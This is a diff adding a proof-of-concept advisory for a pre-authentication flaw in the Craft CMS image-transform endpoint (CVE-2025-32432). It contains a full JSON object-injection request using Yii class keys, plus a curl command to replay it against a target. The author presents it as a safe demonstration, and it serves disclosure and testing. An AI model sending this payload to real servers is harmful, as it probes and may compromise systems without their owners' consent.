@@ -1,0 +1,98 @@
+=============================================================================================================================================
+| # Title     : Craft CMS 5.0 Image Transform Authentication Logic Flaw                                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://craftcms.com                                                                                                        |
+=============================================================================================================================================
+
+POC : 
+
+[+] Description
+
+    A flaw in the Craft CMS image transform endpoint allows an unauthenticated attacker
+    to trigger backend processing without prior authentication. 
+	While the original Metasploit module targeted RCE, (https://packetstorm.news/files/id/190728/  	CVE-2025-32432) 
+	
+
+This PoC does *not* execute code, does *not* write files, and does *not* inject
+payloads. It only proves that the endpoint performs internal logic operations
+without authentication.
+
+# Vulnerability Class
+Authentication Bypass → Pre‑Auth Backend Processing
+
+# Impact
+An attacker can:
+- Trigger image transformation logic without logging in.
+- Interact with backend components not intended for anonymous users.
+- Validate the presence of the vulnerability safely without RCE.
+
+=====================================================================
+POC :
+=====================================================================
+
+Request :
+---------
+POST /index.php?p=actions/assets/generate-transform HTTP/1.1
+Host: TARGET
+Content-Type: application/json
+
+{
+  "assetId": 1,
+  "handle": {
+    "width": 100,
+    "height": 100,
+    "as test": {
+      "class": "craft\\\\behaviors\\\\FieldLayoutBehavior",
+      "__class": "yii\\\\rbac\\\\PhpManager",
+      "__construct()": [
+        { "itemFile": "/dev/null" }
+      ]
+    }
+  }
+}
+
+Effect :
+--------
+- The server processes the transform request.
+- The endpoint responds with a JSON transformation result.
+- This demonstrates the pre-auth processing weakness.
+- No execution, no payload, no harmful operations.
+
+=====================================================================
+How to Save & Use the PoC :
+=====================================================================
+
+1. Save the request into a file named:
+   craftcms_pre_auth_poc.txt
+
+2. Use curl to replay the PoC (legal environments only):
+   curl -X POST \
+     -H "Content-Type: application/json" \
+     -d @craftcms_pre_auth_poc.txt \
+     https://TARGET/index.php?p=actions/assets/generate-transform
+
+3. Expected safe behavior:
+   The server processes the request and responds with JSON even though
+   the attacker is not authenticated.
+
+4. Tools that can import the PoC:
+   - Burp Suite Repeater
+   - OWASP ZAP
+   - Postman Raw HTTP
+
+=====================================================================
+# Recommendation
+- Require authentication on all asset transformation endpoints.
+- Validate input types before passing them to backend behavior handlers.
+- Apply the vendor patch immediately once available.
+
+=====================================================================
+# Disclosure Timeline
+- Original discovery: Orange Cyberdefense CSIRT
+- Educational safe PoC adaptation: indoushka
+- Status: Safe demonstration (no execution)
+=====================================================================
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
